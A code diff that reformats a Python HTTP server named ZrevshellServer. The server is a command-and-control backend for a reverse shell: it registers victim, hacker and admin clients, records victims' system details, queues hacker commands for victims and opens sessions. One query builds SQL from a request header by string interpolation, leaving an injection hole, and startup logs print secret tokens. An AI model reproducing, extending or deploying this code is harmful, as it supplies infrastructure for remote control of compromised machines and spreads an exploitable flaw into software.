@@ -12,7 +12,7 @@ from config import Config
 
 
 class ZrevshellServer(BaseHTTPRequestHandler):
-    """ Request handling. """
+    """Request handling."""
 
     def __init__(self, config: Config, *args, **kwargs):
         # Our configuration: tokens, ip, port and etc...
@@ -35,10 +35,12 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         self.end_headers()
 
     def check_verified_request(self):
-        """ Check if the request is verified by ensuring the existence and validity of auth_token 
-        and existence of the client-id header """
+        """Check if the request is verified by ensuring the existence and validity of auth_token
+        and existence of the client-id header"""
 
-        client_id = self.headers.get("client-id")  # This might be None if the client_id doesn't exist
+        client_id = self.headers.get(
+            "client-id"
+        )  # This might be None if the client_id doesn't exist
         auth_token = self.headers.get("Authorization")  # same goes here
 
         # If the client_id header doesn't exist then we tell the user
@@ -67,11 +69,13 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         return False
 
     def get_client_type(self, client_id: str):
-        """ Get the client type of a specified client from the database. This could also be a means to check if the client
-        has verified itself. """
+        """Get the client type of a specified client from the database. This could also be a means to check if the client
+        has verified itself."""
         # query data from the database
         cursor = self.config.session_data_db.cursor()
-        usr_client_type = self.config.query_db(cursor, f"SELECT client_type FROM clients WHERE client_id='{client_id}'")
+        usr_client_type = self.config.query_db(
+            cursor, f"SELECT client_type FROM clients WHERE client_id='{client_id}'"
+        )
         # Let's return None if the client is not find in the database or an error occurred
         if usr_client_type is None or len(usr_client_type) == 0:
             return None
@@ -79,11 +83,19 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # if it's not let's return the client_type, by flattening out the list and tuple and
         # converting into the client_type thing.
         usr_client_type = usr_client_type[0][0]
-        result = [client_type for client_type in [ut.ClientType.Hacker, ut.ClientType.Victim, ut.ClientType.Admin] if usr_client_type == client_type.__str__()]
+        result = [
+            client_type
+            for client_type in [
+                ut.ClientType.Hacker,
+                ut.ClientType.Victim,
+                ut.ClientType.Admin,
+            ]
+            if usr_client_type == client_type.__str__()
+        ]
         return result[0]
 
     def get_header_token(self, token_name: str, fallback=None):
-        """ Get a header field and return it decoded, use `fallback` if decode error happened and `None` if the header doesn't exist """
+        """Get a header field and return it decoded, use `fallback` if decode error happened and `None` if the header doesn't exist"""
         token = self.headers.get(token_name, None)
 
         try:
@@ -94,7 +106,7 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return fallback
 
     def insert_victim_info_db(self, victim_id: str, json_str: str):
-        """ Insert victims info and specs to the victim_info database. returns None if some error happens"""
+        """Insert victims info and specs to the victim_info database. returns None if some error happens"""
         try:
             victim_info = js.loads(json_str)
         except js.JSONDecodeError:
@@ -112,18 +124,24 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             ram = victim_info.get("ram", None)
 
             # Insert that to the victims database
-            return self.config.execute_on_session_db("INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)", [victim_id, host_name, os, arch, cpu, ram])
+            return self.config.execute_on_session_db(
+                "INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)",
+                [victim_id, host_name, os, arch, cpu, ram],
+            )
         else:
             # Well we couldn't even parse the victim info so let's just
             # insert null everywhere
-            return self.config.execute_on_session_db("INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)", [victim_id, *[None for _ in range(5)]])
+            return self.config.execute_on_session_db(
+                "INSERT INTO victim_info VALUES(?, ?, ?, ?, ?, ?)",
+                [victim_id, *[None for _ in range(5)]],
+            )
 
     def check_verified_for_cmd(self, cmd: str, client_type: int):
-        """ Check if a client is verified to access a server command. """
+        """Check if a client is verified to access a server command."""
         return client_type in self.config.server_cmd_privileges.get(cmd, [])
 
     def get_req_body(self):
-        """ Decode and do everything to read from the body of the request and return the parsed response. """
+        """Decode and do everything to read from the body of the request and return the parsed response."""
         # Get the content length.
         try:
             content_length = int(self.headers.get("content-length", 0))
@@ -146,9 +164,13 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     ########## Server command handler methods ##########
 
     def handle_cmd_verify(self, client_id: str, client_type: int, req_body: str | None):
-        """ Do what needs to be done if the server command sent is 'verify'. """
+        """Do what needs to be done if the server command sent is 'verify'."""
         # First let's check if the user is already in the database
-        result = self.config.query_db(self.config.session_data_db.cursor(), "SELECT * FROM clients WHERE client_id=?", [client_id])
+        result = self.config.query_db(
+            self.config.session_data_db.cursor(),
+            "SELECT * FROM clients WHERE client_id=?",
+            [client_id],
+        )
         # If our result is an empty list that means the user is not there and we can
         # proceed, but if there is something in the list returned, the user already exists
         # so we are going to inform that and stop the execution
@@ -156,7 +178,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             if len(result) > 0:
                 return (False, HTTPStatus.CONFLICT)
         # If our user is valid then we can maybe add him to the database
-        client_insert_op = self.config.execute_on_session_db(f"INSERT INTO clients VALUES(?, ?, 1)", [client_id, client_type])
+        client_insert_op = self.config.execute_on_session_db(
+            f"INSERT INTO clients VALUES(?, ?, 1)", [client_id, client_type]
+        )
         if client_insert_op is None:
             # Some kinda SQL error happened so let's send a internal server error message
             return (False, HTTPStatus.INTERNAL_SERVER_ERROR)
@@ -172,8 +196,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # If all is good return OK
         return (True, HTTPStatus.OK)
 
-    def handle_cmd_post_cmd(self, client_id: str, client_type: int, req_body: str | None):
-        """ Do what needs to be done if the server command is 'post_cmd' """
+    def handle_cmd_post_cmd(
+        self, client_id: str, client_type: int, req_body: str | None
+    ):
+        """Do what needs to be done if the server command is 'post_cmd'"""
         # First lets assign an ID to the command we are inserting to the db
         command_id = ut.generate_token()
 
@@ -201,11 +227,16 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # Now let's check if the victim exists in the database and the user is actually a victim
         # because if the victim doesn't exist, there is no point in adding the data in the db.
         # We can use the self.get_client_type method for that
-        if self.get_client_type(victim_id) is None or self.get_client_type(victim_id) != ut.ClientType.Victim:
+        if (
+            self.get_client_type(victim_id) is None
+            or self.get_client_type(victim_id) != ut.ClientType.Victim
+        ):
             return bad_request
 
         # If we get the values then let's insert them into the database.
-        result = self.config.execute_on_session_db("INSERT INTO commands VALUES(?, ?, ?)", [command_id, victim_id, command])
+        result = self.config.execute_on_session_db(
+            "INSERT INTO commands VALUES(?, ?, ?)", [command_id, victim_id, command]
+        )
 
         if result is None:
             return (False, HTTPStatus.INTERNAL_SERVER_ERROR)
@@ -213,8 +244,10 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # If all went good, lets once again return the OK response
         return (True, HTTPStatus.CREATED)
 
-    def handle_cmd_create_session(self, client_id: str, client_type: int, req_body: str | None):
-        """ Do what needs to be done when the command sent is 'create_session' """
+    def handle_cmd_create_session(
+        self, client_id: str, client_type: int, req_body: str | None
+    ):
+        """Do what needs to be done when the command sent is 'create_session'"""
         # Keep in mind that the req_body in this case is actually the victim_id itself
         # not in json format but plain string.
         victim_id = req_body
@@ -224,7 +257,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return (False, HTTPStatus.BAD_REQUEST)
 
         # Let's check if the victim is valid by using the self.get_client_type function
-        valid_victim = (victim_type := self.get_client_type(victim_id)) is not None and victim_type == ut.ClientType.Victim
+        valid_victim = (
+            victim_type := self.get_client_type(victim_id)
+        ) is not None and victim_type == ut.ClientType.Victim
 
         # If the victim is invalid, send a bad request for the user
         if not valid_victim:
@@ -242,9 +277,18 @@ class ZrevshellServer(BaseHTTPRequestHandler):
         # Finally report the OK message
         return (True, HTTPStatus.OK)
 
-    def execute_command(self, client_id: str, command: str,  handler_func,  *args, client_type_from_headers: bool = False, **kwargs):
-        """ This method is in charge of handling any server command, provided the handler_function which handles the work done for the server command.
-        This method will get the body of the request and validate if the client is eligible of accessing the command. The function will send responses with the client when needed either it be an error or not. the handler_function should accept the and client_id, req_body. The rest arguments and keyword arguments will be passed to the handler_func. req_body will be set to None if there is an error parsing the body."""
+    def execute_command(
+        self,
+        client_id: str,
+        command: str,
+        handler_func,
+        *args,
+        client_type_from_headers: bool = False,
+        **kwargs,
+    ):
+        """This method is in charge of handling any server command, provided the handler_function which handles the work done for the server command.
+        This method will get the body of the request and validate if the client is eligible of accessing the command. The function will send responses with the client when needed either it be an error or not. the handler_function should accept the and client_id, req_body. The rest arguments and keyword arguments will be passed to the handler_func. req_body will be set to None if there is an error parsing the body.
+        """
         legit_client = False
 
         if client_type_from_headers:
@@ -259,9 +303,11 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             admin_token = self.get_header_token("admin-token")
 
             legit_user = {
-                ut.ClientType.Hacker.__str__(): hacker_token is not None and hacker_token == self.config.hacker_token,
-                ut.ClientType.Admin.__str__(): admin_token is not None and admin_token == self.config.admin_token,
-                ut.ClientType.Victim.__str__(): True
+                ut.ClientType.Hacker.__str__(): hacker_token is not None
+                and hacker_token == self.config.hacker_token,
+                ut.ClientType.Admin.__str__(): admin_token is not None
+                and admin_token == self.config.admin_token,
+                ut.ClientType.Victim.__str__(): True,
             }
 
             if client_type is not None and legit_user.get(client_type, False):
@@ -277,7 +323,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             # if the client_type is None it means there is no client
             # with the client_id we gave so let's tell the user that
             # he made an unauthorized request.
-            if client_type is not None and self.check_verified_for_cmd(command, client_type):
+            if client_type is not None and self.check_verified_for_cmd(
+                command, client_type
+            ):
                 legit_client = True
 
         if not legit_client:
@@ -290,7 +338,9 @@ class ZrevshellServer(BaseHTTPRequestHandler):
 
         # Having the post request ready and having a legit client let's execute
         # the handler for the command.
-        result = handler_func(*args, client_id=client_id, client_type=client_type, req_body=body, **kwargs)
+        result = handler_func(
+            *args, client_id=client_id, client_type=client_type, req_body=body, **kwargs
+        )
 
         # Now we will send what the result sends, the result is expected to be
         # a tuple in a format of (result: bool, status_code: HTTPStatus) and we'll use that
@@ -305,11 +355,11 @@ class ZrevshellServer(BaseHTTPRequestHandler):
     ########## HTTP request method handler methods(overridden) ##########
 
     def do_GET(self):
-        """ Handle the GET requests. """
+        """Handle the GET requests."""
         pass
 
     def do_POST(self):
-        """ Handle POST requests. """
+        """Handle POST requests."""
 
         # Check if the request is valid
         if not self.check_verified_request():
@@ -327,11 +377,16 @@ class ZrevshellServer(BaseHTTPRequestHandler):
             return
 
         # ---- Command execution & authorization
-        self.execute_command(client_id, command, self.server_command_functions[command], client_type_from_headers=(True if command == "verify" else False))
+        self.execute_command(
+            client_id,
+            command,
+            self.server_command_functions[command],
+            client_type_from_headers=(True if command == "verify" else False),
+        )
 
 
 def start_server():
-    """ Start the HTTP server """
+    """Start the HTTP server"""
 
     # Initializing our configuration
     configuration = Config()
@@ -353,13 +408,31 @@ def start_server():
     ut.log("info", "-------- Tokens --------")
     # If in debug mode we are going to print the server_commands and
     # the encoded version of the tokens to make debugging easier
-    ut.log("info", f"Authentication Token: {configuration.auth_token}{f'  --  {ut.encode_token(configuration.auth_token)}' if configuration.is_debug else ''}")
-    ut.log("info", f"Administration Token: {configuration.admin_token}{f'  --  {ut.encode_token(configuration.admin_token)}' if configuration.is_debug else ''}")
-    ut.log("info", f"Hacking Token: {configuration.hacker_token}{f'  --  {ut.encode_token(configuration.hacker_token)}' if configuration.is_debug else ''}")
+    ut.log(
+        "info",
+        (
+            "Authentication Token:"
+            f" {configuration.auth_token}{f'  --  {ut.encode_token(configuration.auth_token)}' if configuration.is_debug else ''}"
+        ),
+    )
+    ut.log(
+        "info",
+        (
+            "Administration Token:"
+            f" {configuration.admin_token}{f'  --  {ut.encode_token(configuration.admin_token)}' if configuration.is_debug else ''}"
+        ),
+    )
+    ut.log(
+        "info",
+        (
+            "Hacking Token:"
+            f" {configuration.hacker_token}{f'  --  {ut.encode_token(configuration.hacker_token)}' if configuration.is_debug else ''}"
+        ),
+    )
 
     # Printing the server commands
     if configuration.is_debug:
-        print('\r')
+        print("\r")
         ut.log("info", "--------- Server request endpoints --------")
         for key, val in configuration.server_cmds.items():
             ut.log("info", f"{val} -- {key}")
@@ -385,7 +458,7 @@ def start_server():
 
 
 def main():
-    """ Run the reverse shell server """
+    """Run the reverse shell server"""
     start_server()
 
 
